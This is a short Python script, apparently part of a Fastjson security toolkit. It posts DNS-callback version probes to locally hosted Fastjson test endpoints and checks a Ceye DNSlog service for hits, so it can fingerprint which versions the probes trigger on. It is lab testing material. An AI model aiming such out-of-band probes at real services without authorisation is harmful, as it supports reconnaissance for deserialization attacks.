"""Check which DNS version probes fire per Fastjson version (silent endpoints)."""

from __future__ import annotations

import time

import httpx

from fastjson_toolkit.config import load_dotenv
from fastjson_toolkit.dnslog import CeyeClient, CeyeConfig
from fastjson_toolkit.version.probes import build_dns_version_probes

TARGETS = [
    (18030, "30", False),
    (18047, "47", False),
    (18068, "68", False),
    (18082, "80", False),
    (18080, "83", False),
]


def main() -> None:
    load_dotenv()
    ceye = CeyeConfig.from_env()
    assert ceye
    client = CeyeClient(ceye)
    http = httpx.Client(timeout=10, trust_env=False)
    try:
        for port, tag, at in TARGETS:
            path = "/api/fastjson/silent/autotype" if at else "/api/fastjson/silent"
            filt = CeyeClient.new_filter(f"x{tag}")
            hosts = {
                "le47": client.build_host(filt, tag="47"),
                "le68": client.build_host(filt, tag="68"),
                "d80a": client.build_host(filt, tag="8a"),
                "d80b": client.build_host(filt, tag="8b"),
            }
            for probe in build_dns_version_probes(hosts):
                http.post(
                    f"http://127.0.0.1:{port}{path}",
                    content=probe.payload.encode(),
                    headers={"Content-Type": "application/json"},
                )
            time.sleep(10)
            rec = client.wait_for_dns(filt, timeout=2, interval=1, settle=True)
            names = " ".join(r.name.lower() for r in rec)
            hits = {k: hosts[k].split(".", 1)[0].lower() in names for k in hosts}
            print(f"{tag} at={at} hits={hits} records={len(rec)}")
    finally:
        http.close()
        client.close()


if __name__ == "__main__":
    main()
